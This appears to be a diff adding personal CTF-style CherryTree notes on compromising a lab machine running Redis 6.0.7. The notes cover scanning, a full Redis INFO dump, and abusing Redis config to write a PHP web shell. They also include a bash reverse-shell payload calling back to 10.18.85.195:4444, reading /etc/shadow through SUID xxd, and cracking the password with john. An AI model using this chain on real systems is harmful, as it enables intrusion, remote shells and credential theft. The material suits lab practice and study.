@@ -1,0 +1,244 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Res" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692651293" ts_lastsave="1692674854">
+    <rich_text>nmap -sC -sV -vv -Pn -n 10.10.113.236
+nmap -sC -sV -vv -Pn -n -p 6379 10.10.113.236
+
+PORT      STATE    SERVICE REASON      VERSION
+80/tcp    open     http    syn-ack     Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+
+
+6379/tcp open  redis   syn-ack Redis key-value store 6.0.7
+
+
+7200/tcp  filtered fodms   no-response
+18101/tcp filtered unknown no-response
+
+
+
+gobuster dir -u </rich_text>
+    <rich_text link="webs http://10.10.113.226">http://10.10.113.226</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z -t 50
+</rich_text>
+    <rich_text foreground="#a5a51d1d2d2d">nothing</rich_text>
+    <rich_text>
+
+
+searchsploit redis
+Redis - Replication Code Execution (Metasploit)                              | linux/remote/48272.rb
+</rich_text>
+    <rich_text foreground="#a5a51d1d2d2d">nothing</rich_text>
+    <rich_text>
+
+sudo msfconsole -q 
+exploit/linux/redis/redis_replication_cmd_exec
+</rich_text>
+    <rich_text foreground="#a5a51d1d2d2d">nothing</rich_text>
+    <rich_text>
+
+
+sudo apt install redis-cli
+INFO
+
+# Server
+redis_version:6.0.7
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:5c906d046e45ec07
+redis_mode:standalone
+os:Linux 4.4.0-189-generic x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:5.4.0
+process_id:649
+run_id:5e9d3f2b436139e4c49a406fabaa3c34510f0038
+tcp_port:6379
+uptime_in_seconds:2411
+uptime_in_days:0
+hz:10
+configured_hz:10
+lru_clock:14932243
+executable:/home/</rich_text>
+    <rich_text background="#1a1a5f5fb4b4">vianka</rich_text>
+    <rich_text>/redis-stable/src/redis-server
+config_file:/home/</rich_text>
+    <rich_text background="#1a1a5f5fb4b4">vianka</rich_text>
+    <rich_text>/redis-stable/redis.conf
+io_threads_active:0
+
+# Clients
+connected_clients:1
+client_recent_max_input_buffer:2
+client_recent_max_output_buffer:0
+blocked_clients:0
+tracking_clients:0
+clients_in_timeout_table:0
+
+# Memory
+used_memory:588008
+used_memory_human:574.23K
+used_memory_rss:4956160
+used_memory_rss_human:4.73M
+used_memory_peak:607344
+used_memory_peak_human:593.11K
+used_memory_peak_perc:96.82%
+used_memory_overhead:541522
+used_memory_startup:524536
+used_memory_dataset:46486
+used_memory_dataset_perc:73.24%
+allocator_allocated:830056
+allocator_active:1142784
+allocator_resident:3379200
+total_system_memory:1038393344
+total_system_memory_human:990.29M
+used_memory_lua:37888
+used_memory_lua_human:37.00K
+used_memory_scripts:0
+used_memory_scripts_human:0B
+number_of_cached_scripts:0
+maxmemory:0
+maxmemory_human:0B
+maxmemory_policy:noeviction
+allocator_frag_ratio:1.38
+allocator_frag_bytes:312728
+allocator_rss_ratio:2.96
+allocator_rss_bytes:2236416
+rss_overhead_ratio:1.47
+rss_overhead_bytes:1576960
+mem_fragmentation_ratio:9.09
+mem_fragmentation_bytes:4410656
+mem_not_counted_for_evict:0
+mem_replication_backlog:0
+mem_clients_slaves:0
+mem_clients_normal:16986
+mem_aof_buffer:0
+mem_allocator:jemalloc-5.1.0
+active_defrag_running:0
+lazyfree_pending_objects:0
+
+# Persistence
+loading:0
+rdb_changes_since_last_save:0
+rdb_bgsave_in_progress:0
+rdb_last_save_time:1692651432
+rdb_last_bgsave_status:ok
+rdb_last_bgsave_time_sec:-1
+rdb_current_bgsave_time_sec:-1
+rdb_last_cow_size:0
+aof_enabled:0
+aof_rewrite_in_progress:0
+aof_rewrite_scheduled:0
+aof_last_rewrite_time_sec:-1
+aof_current_rewrite_time_sec:-1
+aof_last_bgrewrite_status:ok
+aof_last_write_status:ok
+aof_last_cow_size:0
+module_fork_in_progress:0
+module_fork_last_cow_size:0
+
+# Stats
+total_connections_received:4
+total_commands_processed:9
+instantaneous_ops_per_sec:0
+total_net_input_bytes:327
+total_net_output_bytes:22595
+instantaneous_input_kbps:0.00
+instantaneous_output_kbps:0.00
+rejected_connections:0
+sync_full:0
+sync_partial_ok:0
+sync_partial_err:0
+expired_keys:0
+expired_stale_perc:0.00
+expired_time_cap_reached_count:0
+expire_cycle_cpu_milliseconds:51
+evicted_keys:0
+keyspace_hits:0
+keyspace_misses:0
+pubsub_channels:0
+pubsub_patterns:0
+latest_fork_usec:0
+migrate_cached_sockets:0
+slave_expires_tracked_keys:0
+active_defrag_hits:0
+active_defrag_misses:0
+active_defrag_key_hits:0
+active_defrag_key_misses:0
+tracking_total_keys:0
+tracking_total_items:0
+tracking_total_prefixes:0
+unexpected_error_replies:0
+total_reads_processed:14
+total_writes_processed:10
+io_threaded_reads_processed:0
+io_threaded_writes_processed:0
+
+# Replication
+role:master
+connected_slaves:0
+master_replid:819f7657e0e328c844f0fbb3336a3adbc07bf5ef
+master_replid2:640d3fa0532423913adc02359cdc7c75386cd353
+master_repl_offset:0
+second_repl_offset:1
+repl_backlog_active:0
+repl_backlog_size:1048576
+repl_backlog_first_byte_offset:0
+repl_backlog_histlen:0
+
+# CPU
+used_cpu_sys:0.516000
+used_cpu_user:2.480000
+used_cpu_sys_children:0.000000
+used_cpu_user_children:0.000000
+
+# Modules
+
+# Cluster
+cluster_enabled:0
+
+# Keyspace
+
+
+10.10.113.236:6379&gt; config set dir /var/www/html
+OK
+10.10.113.236:6379&gt; config set dbfilename redis.php
+OK
+10.10.113.236:6379&gt; set test "&lt;?php phpinfo(); ?&gt;"
+OK
+10.10.113.236:6379&gt; save
+OK
+http://10.10.113.236:80/redis.php
+
+
+set test "&lt;?php exec(\"/bin/bash -c 'sh -i &gt;&amp; /dev/tcp/10.18.85.195/4444 0&gt;&amp;1'\"); ?&gt;"
+nc -nlvp 4444
+python3 -c ‘import pty;pty.spawn("/bin/bash")’		-		shell stablization
+
+
+/home/vinaka/user.txt
+
+
+-rwsr-xr-x 1 root root 19K Mar 18  2020 /usr/bin/xxd
+gtfo bins
+LFILE=/etc/shadow
+./xxd "$LFILE" | xxd -r
+
+
+unshadow passwd hash &gt; unshadow.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt
+beautiful1       (vianka)
+
+sudo su
+
+
+
+
+
+</rich_text>
+  </node>
+</cherrytree>
